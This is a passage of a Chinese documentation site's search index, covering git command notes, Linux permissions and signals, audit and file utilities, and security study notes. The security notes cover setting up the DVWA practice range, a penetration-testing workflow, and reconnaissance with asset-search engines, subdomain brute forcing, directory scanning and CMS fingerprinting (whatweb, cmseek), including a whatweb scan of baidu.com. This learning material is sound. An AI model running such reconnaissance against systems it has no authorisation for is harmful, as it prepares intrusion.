id，而非branch，所以需要切换子模块的分支时，直接在子模块切换后，再返回主工程提交新的子模块commit id即可 删除 删除子模块目录及源码: rm -rf 子模块目录 删除项目目录下.gitmodules文件中子模块相关条目: vim .gitmodules 删除配置项中子模块相关条目: vim .git/config 删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可 rm .git/modules/子模块名 还原暂存区的添加(如果是刚添加的submodule): git restore --staged .","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-submodule.html","loc":"/yq-doc-source-docs-version-control-git-Command-submodule.html"},{"title":"tag","text":"语法指令 创建tag: git tag -a tag-name(如v0.0.1) # 增加一个tag, 下面的例子, 都以 v0.0.1 作为tag名 git tag -a v0.0.1 cc16905 # 对某一提交的信息打tag标签，末尾是一个commit id git tag -a v0.0.1 -m \"version 0.0.1, tag info\" # 创建tag带有说明信息 git tag v0.0.1 # 创建轻量的标签tag(快速创建tag) git tag v0.0.2 be7a3e4 # 给提交的信息打tag，commit id为 be7a3e4 查看tag: git tag # 查看所有标签 git show tag-name # 查看指定的tag git show -s tag-name # 查看指定的tag的hash值 推送到远程: git push origin v0.0.1 # 推送某一tag到远程仓库： git push origin --tags # 一次推送多个标签 git push --tags 删除标签: git tag -d v0.0.1 根据标签检出: git checkout v0.0.1 根据标签回退: # 先查看要回退的标签信息 git show v0.0.1 # 主干分支回退到某个版本(v0.0.1对应的前7为hash) git reset --hard cc16905 tag与commit区别 Git tag是一系列commit的中的一个点, 只能查看, 不能移动。branch是一系列串联的commit的线。 tag是静态的, branch是动态的, 要向前走。 tag分类 轻量级: 仅为某个 commit 引用 带附注: 存储在仓库中的独立对象, 包含有自身校验和信息等等 (常用) 创建tag git tag -a V0.1 -m 'release 0.1' tag选项参数 -a annotated, 一般都是版本号 -m 备注信息 -d 删除某一个tag -v 验证tag 用例: # 创建一个 0.0.0 的tag, 这里只是测试, 一般建议 v0.0.0 作为标签名, v表示version, 0.0.0 表示语义化版本 git tag -a 0 .0.0 -m 'release 0.0.0, test some msg' # 查看有哪些tag git tag # 0.0.0 # 查看某一个tag git show 0 .0.0 # tag 0.0.0 # ... (就不贴出来了) # 推送 git push origin --tags # 若需要删除 git tag -d 0 .0.0 # 推一个空的上去覆盖掉, 达到删除目的 git push origin :refs/tags/0.0.0 # 其他删除方式 # git push origin :0.0.0 # 也可以这样 # git push origin --delete tag 0.0.0 # 获取指定tag git fetch origin tag 0 .0.0 注解 语义化版本规则 版本格式：主版本号.次版本号.修订号, 版本号递增规则如下： 主版本号：当你做了不兼容的 API 修改, 次版本号：当你做了向下兼容的功能性新增, 修订号：当你做了向下兼容的问题修正。 一般都是从 0.1.0 开始","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-tag.html","loc":"/yq-doc-source-docs-version-control-git-Command-tag.html"},{"title":"update-index","text":"用于更新Git索引或暂存区的内容。下面是一些常见用法: --assume-unchanged <file> 将指定文件标记为\"已忽略\"（assume unchanged），即在以后的提交中忽略该文件的修改 ( 告诉Git不要重复扫描该文件的状态，因此如果文件被修改了，Git仍然会提交这些修改 ): git update-index --assume-unchanged <file> --no-assume-unchanged <file> 取消指定文件的\"已忽略\"标记，这样Git将会跟踪所做的修改: git update-index --no-assume-unchanged <file> --skip-worktree <file> 类似于\"已忽略\", 完全忽略文件的修改，即使文件被修改，也不会提交到版本库 git update-index --skip-worktree <file> --no-skip-worktree <file> 取消指定文件的\"已忽略\"标记，这样Git将会跟踪所做的修改: git update-index --no-skip-worktree <file> --add <file> 将指定文件添加到Git索引或暂存区中(仅能添加至暂存区): git update-index --add <file> --remove <file> 从Git索引或暂存区中删除指定文件: git update-index --remove <file> --chmod=(+|-)x <file> 将指定文件标记为可执行: git update-index --chmod=+x <file> 通过使用`git update-index`命令，可以灵活地管理Git索引或暂存区中的文件，以满足特定的需求。 --skip-worktree和--assume-unchanged区别 以下来源于 ChatGpt --skip-worktree的使用示例 假设我们有一个包含敏感信息的文件config.yml，我们将它添加到版本库中并提交了一个初始版本。 接下来，我们在本地修改了该文件，但不希望这些修改被提交到版本库中。 首先，我们需要将config.yml文件标记为\"已忽略\"，以便Git在以后的提交中忽略它的修改。执行以下命令: git update-index --skip-worktree config.yml 然后，我们可以继续修改config.yml文件，不必担心这些修改会被提交到版本库中。如果我们需要取消这个标记，可以使用如下命令: git update-index --no-skip-worktree config.yml 需要注意的是，这个标记只会在本地起作用，不会从版本库中删除文件，也不会阻止其他人在其本地进行修改。 --assume-unchanged的使用示例 假设我们有一个较大的日志文件log.txt，每次执行`git status`或其他Git命令时都需要扫描这个文件，导致速度变慢。 如果我们确定对这个文件的更改不会对版本库产生影响，我们可以将它标记为\"已忽略\"，加快Git命令的执行速度。 首先，使用如下命令将log.txt文件标记为\"已忽略\": git update-index --assume-unchanged log.txt 然后，我们可以继续修改log.txt文件，但这些修改不会出现在`git status`命令的输出中。 如果我们需要取消这个标记，可以使用如下命令: git update-index --no-assume-unchanged log.txt 需要注意的是， git update-index --assume-unchanged 只是告诉Git不要重复扫描该文件的状态， 因此如果文件被修改了，Git仍然会提交这些修改。如果需要完全忽略文件的修改， 应该使用`git update-index --skip-worktree`命令。 如果 不想取消标记提交 : 需要手动将修改的内容添加到Git暂存区中: git add <file> 在执行git commit命令时，需要使用--no-post-rewrite选项来防止Git重写提交历史: git commit -m \"commit message\" --no-post-rewrite 如果其他人在其本地修改了该文件，并提交了更改，您在拉取更新时可能会遇到冲突。 因此，虽然可以不取消对该文件的\"已忽略\"标记并提交修改，但不推荐这样做，因为可能会引起一些问题。 如果您确定需要将文件的修改提交到版本库中，请按照上述步骤进行操作，并确保在提交之前备份您的代码。","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-update-index.html","loc":"/yq-doc-source-docs-version-control-git-Command-update-index.html"},{"title":"编辑器问题","text":"设置vim编辑器: git config --global core.editor 'vim' 背景: 之前不小心安装了, 然后忘了怎么配置称使用这个工具的编辑器, 贼难用, 然后卸载了GitExtensions, 再rebase 的时候就会报错: hint: Waiting for your editor to close the file... \"C:/Program Files (x86)/GitExtensions/GitExtensions.exe\" 设置一下vim编辑器即可.","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Editor-question.html","loc":"/yq-doc-source-docs-version-control-git-Editor-question.html"},{"title":"git 工作原理","text":"每个git项目下都有一个隐藏的 .git 目录, 关于git的一切都存储在这个目录里面（全局配置除外）. 目录结构 info：初始化时只有这个文件, 用于排除提交规则, 与 .gitignore 功能类似。他们的区别在 于.gitignore 这个文件本身会提交到版本库中去, 用来保存的是公共需要排除的文件；而info/exclude 这里设置的则是你自己本地需要排除的文件, 他不会影响到其他人, 也不会提交到版本库中去。 hooks：这个目录很容易理解, 主要用来放一些 git 钩子, 在指定任务触发前后做一些自定义的配置, 这 是另外一个单独的话题, 本文不会具体介绍。 objects：用于存放所有 git 中的对象, 里面存储所有的数据内容, 下面单独介绍。 logs：用于记录各个分支的移动情况, 下面单独介绍。 refs：用于记录所有的引用, 下面单独介绍。 HEAD：文件指示目前被检出的分支 index：文件保存暂存区信息","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Git-work-principle.html","loc":"/yq-doc-source-docs-version-control-git-Git-work-principle.html"},{"title":"换行符问题","text":"主要是 Windows 下, 以及跨平台协作时吧 相关的两个配置: core.autocrlf [true | input | false] # 换行符自动转化 core.safecrlf [true | warn | false] # 检查换行 换行符自动转换 core.autocrlf true (default)提交时、 检出时都转换. 这个在不同系统下不同, 比如 Windows 是提交时将本地的 CRLF 转换为 LF, 检出时反之. input 仅提交时转换为 false 都不转换 检查换行 core.safecrlf true 拒绝提交混合换行符文件 warn 允许提交包含混合换行符文件，但给出警告 false 允许提交包含混合换行符文件 例: git config --local core.autocrlf true git config --local core.safecrlf true git clone --config core.autocrlf=false https://xxx.git","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Sanctuary-problem.html","loc":"/yq-doc-source-docs-version-control-git-Sanctuary-problem.html"},{"title":"DVWA靶场搭建","text":"地址: https://github.com/digininja/DVWA 通过简单明了的界面来练习一些最常见的 Web 漏洞，所练习的漏洞具有不同的难度级别。 请注意，此软件存在提示和无提示的漏洞。 这是特意为止。 我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。 clone到本地: git clone https://github.com/digininja/DVWA.git 注解 不建议放在服务器跟公网本机, 最好是放在虚拟机上, 因为这玩意儿就是个漏洞集合包 默认用户密码: admin password 建议的部署方式 /docs/安全/学习记录/phpStudy搭建 DVWA-Clone 或者下载后, 将其放置/解压到 phpStudy的www目录下","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-DVWA-shooting-range-construction.html","loc":"/yq-doc-source-docs-Safety-Study-record-DVWA-shooting-range-construction.html"},{"title":"渗透流程","text":"明确目标 信息收集 域名，子域名，端口，网站架构，网站目录结构，Apache, JDK, CMS WAF CDN 旁站 c段 漏洞分析/扫描 漏洞利用 证明漏洞存在 POC (proof of content) 形成渗透测试报告 怎么做的 存在哪些漏洞 修复建议","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-Infiltration-process.html","loc":"/yq-doc-source-docs-Safety-Study-record-Infiltration-process.html"},{"title":"Kali信息收集","text":"资产搜集综合工具 Maltego: 强大的跨平台信息搜集工具(可以自动搜集资产) ARL灯塔: 搜集 yakit: 搜集出来还会尝试分析有没有漏洞 (单兵系统) goby: 搜集 ... 流程 信息收集概述 网络空间测绘 端口扫描 子域名暴破 目录扫描 CMS系统指纹识别 信息收集概述 不提前收集可能会遗漏一些方面 比如子域名没收集到 收集的内容 域名 IP 端口 CMS指纹 通过搜索引擎收集信息(google dork) 网络空间测绘 目录扫描 ... 网络空间测绘 网络空间(Cyberspace) WiIIiam Gibson《Neuromancer》1984 网络空间搜索引擎（测绘） 注解 不是指搜索引擎搜索到的HTML, 而是指整个网络世界空间, 比如网关, 摄像头, Web框架, 基站 (一般叫做资产) 常见的搜集平台: # 世界上第一个网络空间搜索引擎 https://www.shodan.io/ # 钟馗之眼 https://www.zoomeye.org/ # 国内被封了, 因为很多人在这上搜集信息 http://fofa.so/ # fafo新地址 https://fofa.info/ # 360 夸克 https://quake.360.net/quake/#/index # 奇安信 鹰图 https://hunter.qianxin.com/ 漏洞总结的地址(会给你最新漏洞以及在搜集平台搜索的语法): # 佩奇 (被封) http://wiki.peiqi.tech/ fofa被封 端口扫描 端口与服务的关系 常见端口号 端口范围: 0 - 65535 大多数人对于常用开源的项目使用的端口都是默认的, 比如 mysql 默认是 3306, 一般不会改为其他的如 8888 端口扫描工具: /docs/安全/kali/kali渗透专用指令/nmap : 网络界的瑞士军刀 子域名暴破 域名 顶级域名 子域名 使用子域名更省钱 在线子域名爆破网站: https://dnsdumpster.com/ 目录扫描 对于每一个服务器, 扫描上面开放的内容 为什么要扫描 可能会存在敏感文件 常见敏感文件 现在常用手段 组织一个常用的词典 对于每一个字典内的数据, 尝试拼接访问, 然后看返回码 常用工具 Burp Suite: /docs/安全/brup/index , /docs/安全/kali/kali渗透专用指令/dirb 御剑 dirbuster CMS系统指纹识别 指纹扫描 CMS(Content Management System) 可以理解为系统用了哪些框架及其版本 因为一般写个什么都是先去看看有没有什么开源的， 所以可以尝试找找有没有使用这些开源项目， 然后根据项目找漏洞 常用工具 Google浏览器插件 \"what runs\" (只能分析前端) /docs/安全/kali/kali渗透专用指令/whatweb /docs/安全/kali/kali渗透专用指令/cmseek Wappalyzer 在线网站 御剑指纹扫描器 Test404轻量CMS指纹识别 ...","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-Kali-information-collection.html","loc":"/yq-doc-source-docs-Safety-Study-record-Kali-information-collection.html"},{"title":"phpStudy搭建","text":"一个快捷的工具集合 包括但不限于 MySQL Apache php 等 用于快速环境部署","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-PHPStudy.html","loc":"/yq-doc-source-docs-Safety-Study-record-PHPStudy.html"},{"title":"whatweb","text":"用于CMS指纹识别 .. 服务框架扫描, VUE啥的. 示例 ┌── ( yanque㉿kali ) - [ ~ ] └─$ whatweb -v www.baidu.com WhatWeb report for http://www.baidu.com Status : 200 OK Title : 百度一下，你就知道 IP : 14 .215.177.38 Country : CHINA, CN Summary : Cookies [ BAIDUID,BDSVRTM,BD_HOME,BIDUPSID,H_PS_PSSID,PSTM ] , Email [ index@2.png,pop_tri@1x-f4a02fac82.png,qrcode-hover@2x-f9b106a848.png,qrcode@2x-daf987ad02.png,result@2.png ] , HTML5, HTTPServer [ BWS/1.1 ] , JQuery, Meta-Refresh-Redirect [ http://www.baidu.com/baidu.html?from = noscript ] , OpenSearch [ /content-search.xml ] , Script [ application/json,text/javascript ] , UncommonHeaders [ bdpagetype,bdqid,traceid ] , X-Frame-Options [ sameorigin ] , X-UA-Compatible [ IE = Edge,chrome = 1 ,IE = edge ] Detected Plugins: [ Cookies ] Display the names of cookies in the HTTP headers. The values are not returned to save on space. String : BAIDUID String : BIDUPSID String : PSTM String : BAIDUID String : BDSVRTM String : BD_HOME String : H_PS_PSSID [ Email ] ... ... HTTP Headers: HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: max-age = 86400 Content-Encoding: gzip Content-Length: 1131 Content-Type: text/html Date: Mon, 02 Jan 2023 10 :15:00 GMT Etag: \"b83-59bafefa98680\" Expires: Tue, 03 Jan 2023 10 :15:00 GMT Last-Modified: Thu, 09 Jan 2020 07 :27:06 GMT P3p: CP = \" OTI DSP COR IVA OUR IND COM \" Server: Apache Set-Cookie: BAIDUID = D4BF2F2CC2550CD470A3E182B2D10463:FG = 1 ; expires = Tue, 02 -Jan-24 10 :15:00 GMT ; max-age = 31536000 ; path = / ; domain = .baidu.com ; version = 1 Vary: Accept-Encoding,User-Agent Connection: close ┌── ( yanque㉿kali ) - [ ~ ] └─$","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html"},{"title":"cmseek","text":"指纹扫描 在Kali中直接输入cmseek，启动该软件, 如果没有安装, 会提示y安装 不带参数默认进入交互式界面 用法: python3 cmseek.py (for guided scanning) cmseek (for guided scanning) python3 cmseek.py [OPTIONS] <Target Specification> cmseek [OPTIONS] <Target Specification> 指定 TARGET: -u URL , --url URL Target Url -l LIST , --list LIST 文件路径, 内容为 url 路径集合, 以逗号分隔 扫描选项: -i cms , --ignore--cms cms 忽略指定的 CMS IDs 以避免失败. 以 comma \",\" 逗号分隔 --strict-cms cms 只检查给定的 CMS IDs, 多个以逗号分隔 --skip-scanned 如果CMS已经预探测过了, 跳过 target --light-scan 跳过深度扫描. 即只探测CMS和版本 -o , --only-cms 只探测CMS, 不进行深度扫描以及版本信息探测 重定向: --follow-redirect 需要进行的重定向 --no-redirect 跳过所有的重定向 用户代理: -r , --random-agent 使用随机用户代理 --googlebot Use Google bot user agent --user-agent USER_AGENT 自定义代理 输出: -v , --verbose 输出详细信息 版本: --version 版本信息 HELP & 杂项(MISCELLANEOUS): -h , --help 帮助 --clear-result 删除所有扫描结果 --batch 扫描每一个site前, 不用手动 enter 用例: python3 cmseek.py -u example.com # 扫描 example.com python3 cmseek.py -l /home/user/target.txt # 扫描 target.txt 中指定的 sites (逗号分隔) python3 cmseek.py -u example.com --user-agent Mozilla 5.0 # 扫描 example.com, 且使用自定义用户代理(user-Agent): Mozilla is 5.0 python3 cmseek.py -u example.com --random-agent # 使用随机用户代理(user-Agent)扫描example.com python3 cmseek.py -v -u example.com # 查看扫描 example.com 的详细输出 示例 cmseek -u www.baidu.com","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html"},{"title":"linux下文件权限","text":"ls -l查看文件格式一共有10位: 9 8 7 6 5 4 3 2 1 0 - r w x r - x r - x 其中, 第9位, 表示文件类型, 支持的类型见 文件类型 8-6位, 表示文件所有者权限, 支持权限见 文件权限 5-3位, 表示文件所属组权限 2-0位, 表示其他用户权限 文件权限 常用权限 以常用权限来说, 权限可分: 读、写、执行, 分别以 r、w、x表示: r, 可读, 可以读出文件的内容 w, 可写, 可以修改文件的内容 x, 可执行, 可运行文件 所有权限 在unix下，文件权限用12个二进制位表示: 11 10 9 8 7 6 5 4 3 2 1 0 S G T r w x r w x r w x 第11位, 为SUID位 第10位, 为SGID位 第9位为, sticky位 文件权限的s位和t位的理解 这里涉及到了Effective UID和Real UID以及Saved UID: Effective UID: 程序实际操作时生效的UID (简称euid) Real UID: 执行该程序的用户的实际UID (简称ruid) Saved UID: 在高权限用户降权后，保留的其原本UID (简称suid) 增加了一个s权限，使该程序在实际运行时Effective UID就会变为0，即root(当文件属主位root时)的UID 创建s和t权限，是为了让一般用户在执行某些程序时，能够暂时拥有改程序拥有者的权限（体现在x位）。 从这一点来说, 该文件必具有x属性 SUID是Set User Id 仅对二进制文件（binary）有效（也就是说对于shell脚本或者目录无效） 执行者需要有x权限 仅在执行该权限的过程中有效 执行者将具有该权限拥有者的权限 SGID是Set Group Id 对二进制文件有效（与suid不同的是，可以作用于目录） 执行者需要有x权限 执行者在执行过程中会获得该程序群组的支持 ls -l查看文件格式一共有10位: 9 8 7 6 5 4 3 2 1 0 - r w x r - x r - x # 这10位中8-6位是文件所有者权限 # 5-3位是同组用户权限 # 2-0位其他用户权限 # 形式为rwx r 表示可读，可以读出文件的内容 w 表示可写，可以修改文件的内容 x 表示可执行，可运行文件 第9位表示文件类型: p表示命名管道文件 d表示目录文件 l表示符号链接文件 -表示普通文件 s表示socket文件 c表示字符设备文件 b表示块设备文件 其实在unix下，文件权限用12个二进制位表示: 11 10 9 8 7 6 5 4 3 2 1 0 S G T r w x r w x r w x # 第11位为SUID位 # 第10位为SGID位 # 第9位为sticky位 文件类型 p: 命名管道文件 d: 目录文件 l: 符号链接文件 -: 表示普通文件 s: socket文件 c: 字符设备文件 b: 块设备文件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html"},{"title":"linux 系统信号","text":"Linux系统有两大类信号 POSIX标准的规则信号(regular signal 1-31编号) 实时信号(real-time signal 32-63) 系统信号 一些常见的的 linux 系统信号。 信号 值 描述 1 SIGHUP 挂起进程 2 SIGINT 终止进程(ctrl+c) 3 SIGQUIT 停止进程 9 SIGKILL 无条件终止进程 强制杀死进程 这个信号进程无法忽视 直接在系统层面把进程杀掉. 所以在Python中他的不能监听的 15 SIGTERM 尽可能终止进程 17 SIGSTOP 无条件停止进程，但不是终止进程 18 SIGTSTP 停止或暂停进程，但不终止进程(ctrl+z) 19 SIGCONT 继续运行停止的进程 参考:: https://blog.csdn.net/qq_55723966/article/details/122304011 规则信号(包括了上面的常用信号) 信号编号 名称 默认动作 说明 1 SIGHUP 终止 终止控制终端或进程. 终端挂起或者控制进程终止 2 SIGINT 终止 由键盘引起的中断(Ctrl-c) 3 SIGQUIT dump 控制终端发送给进程的信号 键盘产生的退出(Ctrl-) 4 GIGILL dusmp 非法指令引起 5 SIGTRAP dump debug中断 6 SIGABRT/SIGIOT dump 异常中止. 由abort(3)发出的退出指令 7 SIGBUS/SIGEMT dump 总线异常/EMT指令 8 SIGFPE dump 浮点运算溢出 9 SIGKILL 终止 强制杀死进程(大招. 进程不可捕获). 这个信号进程无法忽视 直接在系统层面把进程杀掉. 所以在Python中他的不能监听的 10 SIGUSR1 终止 用户信号. 进程可自定义用途 11 SIGSEGV dump 非法内存地址. 无效的内存引用 12 SIGUSR2 终止 用户信号. 进程可自定义用途 13 SIGPIPE 终止 向某个没有读取的管道中写入数据. 管道破裂: 写一个没有读端口的管道 14 SIGALRM 终止 时钟中断(闹钟). 由alarm(2)发出的信号 15 SIGTERM 终止 进程终止(进程可捕获) 16 SIGSTKFLT 终止 协处理器栈错误 17 SIGCHLD 忽略 子进程退出或中断 18 SIGCONT 继续 如进程停止状态则开始运行 19 SIGSTOP 停止 停止进程运行 20 SIGSTP 停止 键盘产生的停止 21 SIGTTIN 停止 后台进程请求输入 22 SIGTTOU 停止 后台进程请求输出 23 SIGURG 忽略 socket发送紧急情况 24 SIGXCPU dump CPU时间限制被打破 25 SIGXFSZ dump 文件大小限制被打破 26 SIGVTALRM 终止 虚拟定时时钟 27 SIGPROF 终止 profile timer clock 28 SIGWINCH 忽略 窗口尺寸调整 29 SIGIO/SIGPOLL 终止 I/O可用 30 SIGPWR 终止 电源异常 31 SIGSYS/SYSUNUSED dump 系统调用异常 注解 由于不同系统中同一个数值对应的信号类型不一样, 所以最好使用信号名称. 信号的数值越小, 优先级越高. 信号量说明(参考) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联. SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出 SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号. SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号. SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用. SIGABRT 程序自己发现错误并调用abort时产生. SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样. SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数. SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误. SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略. SIGUSR1 留给用户使用 SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据. SIGUSR2 留给用户使用 SIGPIPE Broken pipe SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号. SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号. SIGCHLD 子进程结束时, 父进程会收到这个信号. SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符. 参考:: https://www.jianshu.com/p/1a9ea7f4d46e","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-signal.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-signal.html"},{"title":"ausearch","text":"使用ausearch命令可以搜索审计记录，必须以root用户身份执行ausearch命令。 安装: yum install audit # 要么 up2date install audit #debian apt install auditd 语法格式: ausearch [参数] 选项含义 -f <文件名> 基于文件名的搜索 -c <命令行名称> 基于命令行名称的搜索 -n <计算机名称> 基于计算机名称的搜索 -p <进程ID> 基于进程ID的搜索 -k <键字段> 基于键字段的搜索 -m <消息类型> 基于消息类型的搜索 -x <可执行文件名> 基于可执行文件名的搜索 -a <审计事件ID> 基于审计事件ID的搜索 -o <SELinux对象上下文> 基于对象上下文的搜索 -e <退出代码> 基于系统调用退出代码的搜索 -r 完全未格式化输出 -ga<所有组群的ID> 基于所有组群GID的搜索 -ha<主机名> 基于远程主机名的搜索 -ui<用户UID> 基于用户UID的搜索 -tm<终端> 基于终端的搜索 -sv<成功值> 基于系统调用或事件成功值的搜索 -pp<父进程ID> 基于父进程ID的搜索 -ul<用户登录ID> 基于用户登录ID的搜索 -ue<有效UID> 基于有效UID的搜索 -ge<有效GID> 基于有效GID的搜索 -session<登录会话ID> 基于登录会话ID的搜索 -sc<系统调用的名称> 基于系统调用的名称或对象编号的搜索 -se<SELinux上下文> 基于任何主体或对象的上下文搜索 -ts<开始日期><开始日期>, --start<开始日期><开始日期> 基于开始时间、开始时间的搜索 -ua<所有用户的UID> 基于所有的用户UID的搜索 -te<结束时间><结束时间> 基于结束时间、结束时间的搜索 -su<SELinux上下文> 基于主题的上下文的搜索 例 基于用户root搜索审计记录: [root@localhost ~]# ausearch -ui 0 基于终端tty1搜索审计记录: [root@localhost ~]# ausearch -tm tty1 基于进程号1779搜索审计记录: [root@localhost ~]# ausearch -p 1779","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AUSEARCH.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AUSEARCH.html"},{"title":"cmp","text":"Linux cmp命令用于比较两个文件是否有差异。 当相互比较的两个文件完全一样时，则该指令不会显示任何信息。 若发现有所差异，预设会标示出第一个不同之处的字符和列数编号。 若不指定任何文件名称或是所给予的文件名为\"-\"，则cmp指令会从标准输入设备读取数据。 语法 : cmp [-clsv][-i <字符数目>][--help][第一个文件][第二个文件] 参数 ： -c , --print-chars 除了标明差异处的十进制字码之外，一并显示该字符所对应字符。 -i <字符数目> , --ignore-initial= <字符数目> 指定一个数目。 -l , --verbose 标示出所有不一样的地方。 -s , --quiet , --silent 不显示错误信息。 -v , --version 显示版本信息。 --help 在线帮助。 实例 要确定两个文件是否相同，请输入: cmp prog.o.bak prog.o 这比较 prog.o.bak 和 prog.o。如果文件相同，则不显示消息。 如果文件不同，则显示第一个不同的位置；例如: prog.o.bak prog.o differ: char 4, line 1 如果显示消息 cmp: EOF on prog.o.bak 则 prog.o 的第一部分与 prog.o.bak 相同，但在 prog.o 中还有其他数据。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-CMP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-CMP.html"},{"title":"command","text":"command -v 可以判断一个命令是否支持，如果一个脚本需要，或者还要加if判断: if command -v python ;then echo yes fi","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Command.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Command.html"},{"title":"diff","text":"文件对比","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DIFF.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DIFF.html"},{"title":"flock","text":"flock是Linux下的文件锁。 当多个进程可能会对同样的数据执行操作时, 这些进程需要保证其它进程没有也在操作, 以免损坏数据。 -s , --shared 获取一个共享锁, 在定向为某文件的FD上设置共享锁而未释放锁的时间内, 其他进程试图在定向为此文件的FD上设置独占锁的请求失败, 而其他进程试图在定向为此文件的FD上设置共享锁的请求会成功。 -x , -e , --exclusive 获取一个排它锁, 或者称为写入锁, 为默认项。 -u , --unlock 手动释放锁, 一般情况不必须, 当FD关闭时, 系统会自动解锁, 此参数用于脚本命令一部分需要异步执行, 一部分可以同步执行的情况。 -n , --nb , --nonblock 非阻塞模式, 当获取锁失败时, 返回1而不是等待。 -w , --wait , --timeout seconds 设置阻塞超时, 当超过设置的秒数时, 退出阻塞模式, 返回1, 并继续执行后面的语句。 -o , --close 表示当执行command前关闭设置锁的FD, 以使command的子进程不保持锁。 -c , --command command 在shell中执行其后的语句。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-FLOCK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-FLOCK.html"},{"title":"locale-gen","text":"默认情况下，为基于 libc 的程序的本地化提供基本支持的 locale 包不包含每种支持语言的可用本地化文件。 由于此类文件的巨大大小以及 libc 支持的大量语言，此限制变得必要。 因此，Debian 使用了一种特殊的机制，我们在目标主机上准备实际的本地化文件并仅分发它们的模板。 locale-gen 是一个程序，它读取文件 /etc/locale.gen 并为所选的本地化配置文件调用 localedef 。 修改 /etc/locale.gen 文件后运行 locale-gen 。 /etc/locale.gen 主配置文件，具有简单的格式：每行不为空且不以 # 开头的行都被视为要构建的语言环境定义。 /var/lib/locales/supported.d/ 包含语言包提供的 locale.gen 片段的目录。不要手动编辑这些，它们将在包升级时被覆盖。 名字: locale-gen - 编译本地定义文件的一个列表 简介: locale-gen [options] [locale] [language] 描述: 编译本地文件需要50M的磁盘容量，并却大部分用户仅需要很少的locales. 为了节省磁盘容量，编译的locale 文件不在Locales包中发布， 但是当这些包通过运行locale-gen程序安装的时候，可选的locales是自动产生的。 如果languages和locales的一个列表被具体到一个参数， 那么locale-gen 仅仅产生这些具体的locales， 并添加新的一些到/var/lib/locales/supported.d/local文件中。 否则产生所有的支持的locales. locale 数据文件可以存储在一个单一的二进制文件（/usr/lib/locale/locale-archive） ， 或者在一个更深的树形结构下的个人文件/usr/lib/locale/<locale_name>/LC_*. 但是不像locales包，当运行locale-gen时，编译的locale definitions不被移除， 如果locale源代码文件修改了，locales 才可以在一次编译。 选项, 这些选项覆盖了/etc/belocs/locale-gen.conf下的设置 --help 一些帮助信息和退出 --purge 在运行之前，移除所有存在的locales --no-purge 与上相反 --archive 当这个选项被设置，Locale数据是被存储在单一的文档/usr/lib/locale/locale-archive --no-archive . --aliases= <FILE locale> 别名从FILE文件中读出 文件： /var/lib/locales/supported.d/* 列出了所有要产生的Locales。文件格式和/usr/share/i18n/SUPPORTED 相似。 /etc/belocs/locale-gen.conf 自定义编译的locale文件怎么存储到磁盘上。 /usr/lib/locale/<locale-name>/LC_* 编译Locale数据 /usr/lib/locale/locale-archive 产生包含编译的locale数据的归档，如果--archive 被设置 /var/lib/belocs 用于追踪在Locale源码文件变化的目录 环境变量： 这些环境变量影响到每一个对所有的locale-aware程序的Locale类别 LC_CTYPE Character classification and case conversion. LC_COLLATE Collation order. LC_TIME Date and time formats. LC_NUMERIC Non-monetary numeric formats. LC_MONETARY Monetary formats. LC_MESSAGES Formats of informative and diagnostic messages and interactive responses. LC_PAPER Paper size. LC_NAME Name formats. 